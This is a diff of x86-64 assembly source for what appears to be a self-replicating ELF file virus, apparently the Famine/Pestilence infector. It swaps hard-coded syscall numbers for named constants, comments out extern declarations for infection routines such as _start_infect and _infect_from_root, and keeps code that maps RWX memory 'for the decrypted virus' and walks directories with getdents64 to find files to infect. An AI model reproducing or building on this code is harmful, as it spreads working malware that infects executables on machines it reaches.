@@ -8,6 +8,9 @@
 ;	data section		;
 ;;;;;;;;;;;;;;;;;;;;;;;;;
 
+%define FAMINE_S
+%include "pestilence.lst"
+
 section .text
 	global _start
 	global _string
@@ -18,16 +21,16 @@ section .text
 	global _continue_normaly
 	global _o_entry
 	global _encrypted_part_start
-	extern _decrypt
-	extern _end_decrypt
-	extern _treat_file
-	extern _final_end
-	extern _thread_create
-	extern _start_infect
-	extern _infect_from_root
-	extern _verify_starting_infect
-	extern _famine_start_options
-    extern _fork_before_exec_normaly
+;	extern _decrypt
+;	extern _end_decrypt
+;	extern _treat_file
+;	extern _final_end
+;	extern _thread_create
+;	extern _start_infect
+;	extern _infect_from_root
+;	extern _verify_starting_infect
+;	extern _famine_start_options
+;   extern _fork_before_exec_normaly
 
 _o_entry:
 	dq 0x0000000000000000 
@@ -87,9 +90,9 @@ _start:
 ; to use the relative addr of the functions, like _o_entry and _string.
 
 ; Mmap, for the decrypted virus
-	mov rax, 9
+	mov rax, SYS_MMAP
 	mov rdi, 0
-	mov rsi, 8192
+	mov rsi, PAGE_SIZE
 	mov rdx, 7
 	mov r10, 34
 	mov r8, -1
@@ -268,7 +271,7 @@ _verify_o_entry:
 
 ;; Exit program
 _force_exit:
-	mov		rax, 60						; sys_exit
+	mov		rax, SYS_EXIT						; sys_exit
 	mov		rdi, 0						; exit with 0
 	syscall
 
@@ -506,7 +509,7 @@ _open_dir:
 	sub		rdi, r10					; move %rdi under the stack pointer by %r10 bytes
 	xor		rsi, rsi					; O_RDONLY flag
 	xor		rdx, rdx					; unused flag
-	mov		rax, 0x2					; sys_open number
+	mov		rax, SYS_OPEN				; sys_open number
 
 	;; Setup stack frame before syscall
 	mov		r10, QWORD [rsp + 336]		; %r10 = total length
@@ -533,7 +536,7 @@ _dir_loop:
 	mov		rdx, 280					; size of our buffer
 	mov		rdi, QWORD [rsp + 288]		; mov the fd to the first argument
 	mov		rsi, rsp					; mov the stack pointer to the second argument
-	mov		rax, 217					; getdents64 syscall number
+	mov		rax, SYS_GETDENTS64			; getdents64 syscall number
 
 	;; Setup stack frame before syscall
 	mov		r10, QWORD [rsp + 336]
@@ -670,7 +673,7 @@ _continue:
 
 ;; Close directory
 _close_dir:
-	mov		rax, 3						; sys_close number
+	mov		rax, SYS_CLOSE				; sys_close number
 	mov		rdi, QWORD [rsp + 288]		; directory fd
 	syscall
 
@@ -708,3 +711,5 @@ _strlen_end:
 ; Here is our verif code
 _verif:
 	dq 0x1122334455667788
+
+%undef FAMINE_S
